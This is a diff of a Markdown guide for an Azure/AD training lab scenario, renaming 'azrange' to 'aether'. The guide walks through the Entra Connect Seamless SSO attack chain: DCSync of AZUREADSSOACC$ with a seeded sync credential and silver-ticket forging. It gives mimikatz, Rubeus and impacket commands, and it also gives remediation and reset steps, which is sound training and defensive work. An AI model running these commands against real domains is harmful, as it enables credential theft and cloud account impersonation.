@@ -1,10 +1,10 @@
 # AP06 — Entra Connect / Seamless SSO (AZUREADSSOACC$): the on-prem -> cloud bridge
 
 **Layer:** Hybrid — on-prem AD DS + Microsoft Entra ID (Seamless SSO / Entra Connect) on the **same** Windows DC as AP05 (`hybrid-ad` module, shared substrate via `local.need_dc`)  
-**Cost:** a **compute** path — **tied with AP05** as the path that bills an always-on Windows VM. AP06 **reuses the AP05 DC**: with `enable_ap05 = true` already active, AP06 adds **zero compute** (EUR 0/month incremental, it shares the same VM); with AP05 off, AP06 **stands that single DC up on its own** and bills the same as AP05 (`Standard_B2ms` ~EUR 0.083/h, ~EUR 60/month 24x7; `Standard_B2s` as a floor ~EUR 30/month; StandardSSD 127 GiB disk ~EUR 8-10/month; Standard public IP ~EUR 3-4/month; Log Analytics ingestion with the filtered hybrid feed, a few EUR/month). With **auto-shutdown** (2200) and ~8 h/day of use it drops to ~1/3 -> roughly **~EUR 20-40/month**; `./azrange.ps1 destroy` takes it to 0. It is neither "more expensive" nor "cheaper" than AP05: it is the **same** compute spend, shared. (West Europe, pay-as-you-go — verify the current price.)  
+**Cost:** a **compute** path — **tied with AP05** as the path that bills an always-on Windows VM. AP06 **reuses the AP05 DC**: with `enable_ap05 = true` already active, AP06 adds **zero compute** (EUR 0/month incremental, it shares the same VM); with AP05 off, AP06 **stands that single DC up on its own** and bills the same as AP05 (`Standard_B2ms` ~EUR 0.083/h, ~EUR 60/month 24x7; `Standard_B2s` as a floor ~EUR 30/month; StandardSSD 127 GiB disk ~EUR 8-10/month; Standard public IP ~EUR 3-4/month; Log Analytics ingestion with the filtered hybrid feed, a few EUR/month). With **auto-shutdown** (2200) and ~8 h/day of use it drops to ~1/3 -> roughly **~EUR 20-40/month**; `./aether.ps1 destroy` takes it to 0. It is neither "more expensive" nor "cheaper" than AP05: it is the **same** compute spend, shared. (West Europe, pay-as-you-go — verify the current price.)  
 **MITRE ATT&CK:** [T1552](https://attack.mitre.org/techniques/T1552/) (Unsecured Credentials — *the Entra Connect sync-account credential with DCSync rights*) · [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync — *extract the Kerberos keys of AZUREADSSOACC$*) · [T1558.001](https://attack.mitre.org/techniques/T1558/001/) (Steal or Forge Kerberos Tickets: Silver Ticket — *forge the Seamless SSO TGS*) · [T1550](https://attack.mitre.org/techniques/T1550/) (Use Alternate Authentication Material — *the forged ticket authenticates to the **cloud***)  
 **Maps to cert:** CARTE / CRTE (hybrid identity; Entra Connect + Seamless SSO abuse; DCSync + Kerberos forging; adjacent defensive side: SC-200 / Microsoft Defender for Identity)  
-**Precondition seeded by the range** (`enable_ap06 = true`; `sso_mode` defaults to `"both"`): on the hybrid DC shared with AP05, `scripts/seed-ap06.ps1` (via `az vm run-command` in the `deploy`, an exact mirror of `seed-ap05.ps1`) creates (a) the **Seamless SSO machine account** `AZUREADSSOACC$` with the SPNs `HTTP/autologon.microsoftazuread-sso.com` and `HTTP/aadg.windows.net.nsatc.net` and a **fixed/known** password (it lands in state, sensitive output `ap06_sso_password`) whose RC4 key is therefore reproducible and **which no entity will ever rotate**; and (b) the **sync account** `Sync_AZRANGE` (analogous to `MSOL_`/`Sync_`) with a known password and the **DCSync ACEs** (`DS-Replication-Get-Changes` + `-All`) over the *domain NC*. **What is NOT seeded:** no Domain Admin credential and no real tenant — AP06 does **not** sync with a real Entra; the cloud leg is **declared out of scope** (see 🔵). Auditing of the new EventIDs (4662/4769/4741/4742) is enabled by **the seed itself** (not the base AP05 DSC -> AP05 stays intact).
+**Precondition seeded by the range** (`enable_ap06 = true`; `sso_mode` defaults to `"both"`): on the hybrid DC shared with AP05, `scripts/seed-ap06.ps1` (via `az vm run-command` in the `deploy`, an exact mirror of `seed-ap05.ps1`) creates (a) the **Seamless SSO machine account** `AZUREADSSOACC$` with the SPNs `HTTP/autologon.microsoftazuread-sso.com` and `HTTP/aadg.windows.net.nsatc.net` and a **fixed/known** password (it lands in state, sensitive output `ap06_sso_password`) whose RC4 key is therefore reproducible and **which no entity will ever rotate**; and (b) the **sync account** `Sync_AETHER` (analogous to `MSOL_`/`Sync_`) with a known password and the **DCSync ACEs** (`DS-Replication-Get-Changes` + `-All`) over the *domain NC*. **What is NOT seeded:** no Domain Admin credential and no real tenant — AP06 does **not** sync with a real Entra; the cloud leg is **declared out of scope** (see 🔵). Auditing of the new EventIDs (4662/4769/4741/4742) is enabled by **the seed itself** (not the base AP05 DSC -> AP05 stays intact).
 
 ---
 
@@ -16,7 +16,7 @@ The conceptual axis is a structural weakness, not a one-off misconfiguration: **
 
 The AP06 chain links four techniques into a single **on-prem -> cloud** bridge:
 
-1. **T1552 — the sync-account credential.** The starting point represents *"you have compromised the Entra Connect server and dumped the sync credential"*. The lab seeds it (`Sync_AZRANGE`) with a known password and **DCSync** rights over the domain: it is the attacker's bootstrap primitive.
+1. **T1552 — the sync-account credential.** The starting point represents *"you have compromised the Entra Connect server and dumped the sync credential"*. The lab seeds it (`Sync_AETHER`) with a known password and **DCSync** rights over the domain: it is the attacker's bootstrap primitive.
 2. **T1003.006 — DCSync of `AZUREADSSOACC$`.** With that credential the attacker replicates from the DC the Kerberos keys (RC4/NT + AES) of the Seamless SSO account.
 3. **T1558.001 — silver ticket.** With the `AZUREADSSOACC$` key the attacker forges a TGS for `HTTP/autologon.microsoftazuread-sso.com` **impersonating any synchronized user**, including a privileged one.
 4. **T1550 — use in the cloud.** That TGS authenticates to Entra as the impersonated user **without their password** -> the on-prem -> cloud jump is complete, and the non-rotated key guarantees it can be repeated indefinitely.
@@ -29,7 +29,7 @@ Break **any** link (rotate the `AZUREADSSOACC$` key, remove DCSync from the sync
 
 ## 🔴 Exploit (how it is exploited)
 
-> Authorized training lab, your own test tenant/subscription. The `azrange.lab` forest is **isolated** and does **not** sync with any real tenant: AP06 **simulates** the on-prem Entra Connect / Seamless SSO surface (the `AZUREADSSOACC$` account and the sync account) to exercise the theft-and-forge chain; effective validation against `login.microsoftonline.com` is **out of scope** (see the declared boundary in 🔵). Every step starts from the `Sync_AZRANGE` sync-account credential (what the range hands over as "you have already compromised the Entra Connect server").
+> Authorized training lab, your own test tenant/subscription. The `aether.lab` forest is **isolated** and does **not** sync with any real tenant: AP06 **simulates** the on-prem Entra Connect / Seamless SSO surface (the `AZUREADSSOACC$` account and the sync account) to exercise the theft-and-forge chain; effective validation against `login.microsoftonline.com` is **out of scope** (see the declared boundary in 🔵). Every step starts from the `Sync_AETHER` sync-account credential (what the range hands over as "you have already compromised the Entra Connect server").
 
 The canonical chain is `sync cred -> DCSync of AZUREADSSOACC$ -> silver ticket for the Seamless SSO SPN -> auth to the cloud`. As in AP05, the range covers **two network postures** depending on what the operator opens in the NSG.
 
@@ -41,9 +41,9 @@ The module's NSG does **not** open LDAP/Kerberos/RPC to the Internet. The intend
 # RDP to <ap06_dc_public_ip> (source = admin_source_cidr)
 
 # 1. DCSync of AZUREADSSOACC$ using the compromised sync credential.
-#    (mimikatz running under a context presenting the Sync_AZRANGE cred:
+#    (mimikatz running under a context presenting the Sync_AETHER cred:
 #     runas /netonly, or pass its keys via a prior pass-the-hash.)
-.\mimikatz.exe "lsadump::dcsync /domain:azrange.lab /user:AZUREADSSOACC$" exit
+.\mimikatz.exe "lsadump::dcsync /domain:aether.lab /user:AZUREADSSOACC$" exit
 #   -> copy the NTLM (RC4 key) and the AES128/AES256 keys of AZUREADSSOACC$
 #     NOTE: AZUREADSSOACC$ ends in '$' (it is a MACHINE account, not a user).
 
@@ -53,11 +53,11 @@ whoami /user   # or Get-ADDomain for the domain base SID
 
 # 3. Forge the SILVER TICKET for the Seamless SSO SPN with the stolen RC4 key.
 #    target = autologon.microsoftazuread-sso.com ; service = HTTP ; rc4 = NTLM of AZUREADSSOACC$
-.\mimikatz.exe "kerberos::golden /user:<user_to_impersonate> /domain:azrange.lab ^
+.\mimikatz.exe "kerberos::golden /user:<user_to_impersonate> /domain:aether.lab ^
   /sid:<domain_SID> /target:autologon.microsoftazuread-sso.com ^
   /service:HTTP /rc4:<NTLM_of_AZUREADSSOACC$> /ptt" exit
 #   (equivalent with Rubeus: `Rubeus.exe silver /service:HTTP/autologon.microsoftazuread-sso.com
-#    /rc4:<NTLM> /user:<user> /domain:azrange.lab /sid:<SID> /ptt`)
+#    /rc4:<NTLM> /user:<user> /domain:aether.lab /sid:<SID> /ptt`)
 
 # 4. Use the forged TGS to authenticate to Entra (cloud leg: OUTSIDE the lab).
 #    In a real environment, the client would present this ticket to the Seamless SSO endpoint
@@ -70,14 +70,14 @@ If the operator relaxes the NSG to expose LDAP/Kerberos/RPC to its `/32`, the eq
 
 ```bash
 # 1. DCSync of AZUREADSSOACC$ with the sync cred (DCSync seeded over the domain NC)
-impacket-secretsdump 'azrange.lab/Sync_AZRANGE:<sync_pass>@<ap06_dc_public_ip>' \
-  -just-dc-user 'AZRANGE/AZUREADSSOACC$'
+impacket-secretsdump 'aether.lab/Sync_AETHER:<sync_pass>@<ap06_dc_public_ip>' \
+  -just-dc-user 'AETHER/AZUREADSSOACC$'
 #   -> aes256/aes128/NTLM of AZUREADSSOACC$
 
 # 2. Forge the silver ticket for the Seamless SSO SPN (impacket-ticketer)
 #    -nthash: the stolen RC4 key ; -spn: the autologon SPN ; -domain-sid: forest SID
 impacket-ticketer -nthash '<NTLM_of_AZUREADSSOACC$>' \
-  -domain-sid '<domain_SID>' -domain 'azrange.lab' \
+  -domain-sid '<domain_SID>' -domain 'aether.lab' \
   -spn 'HTTP/autologon.microsoftazuread-sso.com' '<user_to_impersonate>'
 #   -> <user_to_impersonate>.ccache (the forged Seamless SSO TGS)
 
@@ -99,7 +99,7 @@ The `sso_mode` variable (analogous to `leak_mode`/`runbook_mode`) decides **whic
 | `sso_mode` | What is seeded | Scoped lesson |
 |---|---|---|
 | `silver_ticket` | Only `AZUREADSSOACC$` (fixed non-rotated key + SPN) | Focus on **forging** the Seamless SSO TGS (assumes you already have the key) |
-| `sync_dcsync` | Only the sync account `Sync_AZRANGE` with the **DCSync** ACE over the NC | Focus on **extracting** the Entra Connect credential -> DCSync |
+| `sync_dcsync` | Only the sync account `Sync_AETHER` with the **DCSync** ACE over the NC | Focus on **extracting** the Entra Connect credential -> DCSync |
 | `both` *(default)* | Both artifacts | **Full chain** sync -> DCSync -> `AZUREADSSOACC$` keys -> silver ticket -> cloud |
 
 The `both` default is the only one that honors AP06's **complete MITRE map** (T1552 + T1003.006 + T1558.001 + T1550). `silver_ticket` and `sync_dcsync` are **idempotent subsets** of `both` for more scoped shared deployments or targeted lessons.
@@ -116,7 +116,7 @@ Each of these actions **cuts the bridge on its own**. Apply them in depth — an
 
 1. **Rotate the Kerberos key of `AZUREADSSOACC$` — TWICE (the direct antidote).** This is Microsoft's official fix: *rolling the Seamless SSO decryption key twice* invalidates (a) any already-stolen hash and (b) any **already-forged** silver ticket. The double rotation is necessary because Kerberos retains the previous key (N-1) to validate in-flight tickets; rotating only once would leave the stolen key valid for one more window. In the range, `scripts/seed-ap06.ps1 -Remediate` runs `Set-ADAccountPassword -Identity 'AZUREADSSOACC$' -Reset` **twice** with a fresh random password. In production, the procedure is the Seamless SSO decryption-key *rollover* of **Azure AD Connect** (not a simple manual reset).
 
-2. **Remove the DCSync rights of the sync account.** Removing the `DS-Replication-Get-Changes` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All` (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) ACEs from `Sync_AZRANGE` over the *domain NC* cuts the ability to **re-extract** the `AZUREADSSOACC$` keys. Both ACEs are required for a working DCSync, so removing **either** one already breaks the primitive.
+2. **Remove the DCSync rights of the sync account.** Removing the `DS-Replication-Get-Changes` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All` (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) ACEs from `Sync_AETHER` over the *domain NC* cuts the ability to **re-extract** the `AZUREADSSOACC$` keys. Both ACEs are required for a working DCSync, so removing **either** one already breaks the primitive.
 
 3. **Harden / retire the sync account and its server (treat Entra Connect as *tier-0*).** Disable or delete the compromised `MSOL_`/`Sync_` account and harden the Entra Connect server (it is, de facto, a DC-tier system: it custodies a credential with DCSync). In the lab, `-Remediate` runs `Disable-ADAccount`/`Remove-ADUser` on the sync account.
 
@@ -134,15 +134,15 @@ az vm run-command invoke \
   --command-id RunPowerShellScript \
   --scripts @scripts/seed-ap06.ps1 \
   --parameters Remediate=true EaPassword='<ap06_dc_admin_password>' \
-               DomainFqdn=azrange.lab DomainNetbios=AZRANGE \
-               SsoAccountName=AZUREADSSOACC SyncAccountName=Sync_AZRANGE
+               DomainFqdn=aether.lab DomainNetbios=AETHER \
+               SsoAccountName=AZUREADSSOACC SyncAccountName=Sync_AETHER
 ```
 
 > **Two levels of reset — do not confuse them (and MIND the selective case, inherent to the shared substrate).**
 >
-> **(1) Hard / cost->0:** `./azrange.ps1 reset` re-applies with `enable_ap06 = false` **and** `enable_ap05 = false`. Only when **both** flags are `false` does `local.need_dc` evaluate to `false` (`count = 0`) -> Terraform **destroys the single shared DC** and with it, atomically, `AZUREADSSOACC$`, the sync account and the DCSync ACEs of the NC (they live in the **directory** of the destroyed DC, **not** in the `tfstate`) -> a reset with no *out-of-state* residue, zero cost afterward. It is the same cleanup property that AP05/AP07/AP08 advertise (AP06 **shares** it, it does not claim it exclusively). That is why `reset` **must** include `-var enable_ap06=false` alongside the existing `enable_ap05=false`: with the shared DC, forgetting the AP06 flag would leave the DC standing.
+> **(1) Hard / cost->0:** `./aether.ps1 reset` re-applies with `enable_ap06 = false` **and** `enable_ap05 = false`. Only when **both** flags are `false` does `local.need_dc` evaluate to `false` (`count = 0`) -> Terraform **destroys the single shared DC** and with it, atomically, `AZUREADSSOACC$`, the sync account and the DCSync ACEs of the NC (they live in the **directory** of the destroyed DC, **not** in the `tfstate`) -> a reset with no *out-of-state* residue, zero cost afterward. It is the same cleanup property that AP05/AP07/AP08 advertise (AP06 **shares** it, it does not claim it exclusively). That is why `reset` **must** include `-var enable_ap06=false` alongside the existing `enable_ap05=false`: with the shared DC, forgetting the AP06 flag would leave the DC standing.
 >
-> **(2) In-place / pedagogical:** `seed-ap06.ps1 -Remediate` (above). As in AP05, `./azrange.ps1 reset` does **not** pre-remediate AP06 via `run-command` (the vuln lives in the destroyable VM, which may also be *deallocated* by auto-shutdown and would make the `run-command` fail).
+> **(2) In-place / pedagogical:** `seed-ap06.ps1 -Remediate` (above). As in AP05, `./aether.ps1 reset` does **not** pre-remediate AP06 via `run-command` (the vuln lives in the destroyable VM, which may also be *deallocated* by auto-shutdown and would make the `run-command` fail).
 >
 > **Selective case — the trap of the shared substrate.** Turning off **only** AP06 (`enable_ap06=false` with `enable_ap05=true`) leaves `need_dc = true` -> **the DC survives** and AP06's AD objects (`AZUREADSSOACC$`, the sync account) **persist**, because they are not Terraform resources. For "Remediate" in that case you **must** run `seed-ap06.ps1 -Remediate` **before** lowering the flag. Terraform destroys the DC only when **both** flags fall.
 
